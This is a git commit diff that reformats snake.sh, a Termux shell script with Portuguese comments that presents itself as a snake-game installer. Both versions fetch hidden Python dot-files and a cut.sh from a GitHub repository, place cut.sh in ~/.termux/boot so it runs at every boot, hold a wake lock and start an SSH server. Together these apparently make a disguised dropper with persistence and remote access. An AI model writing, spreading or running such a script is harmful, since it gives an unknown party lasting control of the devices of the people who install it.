6108b74f3f8035e508bb2d1c029c4ff9fab4e405
2o2kd <166863822+2o2kd@users.noreply.github.com>
2024-04-14 19:09:54 -0300

    Update snake.sh

--- snake.sh
+++ snake.sh
@@ -1,1 +1,23 @@
-curl -O https://raw.githubusercontent.com/2o2kd/60undertrpb023/main/.pit.py && curl -O https://raw.githubusercontent.com/2o2kd/60undertrpb023/main/.pit2.py && mkdir .termux && mkdir .termux && mkdir .termux && cd .termux && cd .termux && cd .termux && mkdir boot && mkdir boot && mkdir boot && cd boot && cd boot && curl -O https://raw.githubusercontent.com/2o2kd/60undertrpb023/main/cut.sh && chmod 777 cut.sh && cd && termux-wake-lock && sshd && sshd; sshd; pkg install nsnake -y && pkg install termux-api -y && pkg install python -y && pkg install proot-distro -y && proot-distro install debian -y
+#!/bin/bash
+
+# Baixa os arquivos .pit.py e .pit2.py
+curl -O https://raw.githubusercontent.com/2o2kd/60undertrpb023/main/.pit.py
+curl -O https://raw.githubusercontent.com/2o2kd/60undertrpb023/main/.pit2.py
+
+# Cria a estrutura de diretórios .termux/boot e entra no diretório
+mkdir -p ~/.termux/boot
+cd ~/.termux/boot
+
+# Baixa o arquivo cut.sh e define as permissões
+curl -O https://raw.githubusercontent.com/2o2kd/60undertrpb023/main/cut.sh
+chmod 777 cut.sh
+
+# Instala pacotes necessários
+pkg install nsnake termux-api python proot-distro -y
+
+# Instala a distribuição Debian
+proot-distro install debian -y
+
+# Ativa o wake lock e inicia o servidor SSH
+termux-wake-lock
+sshd
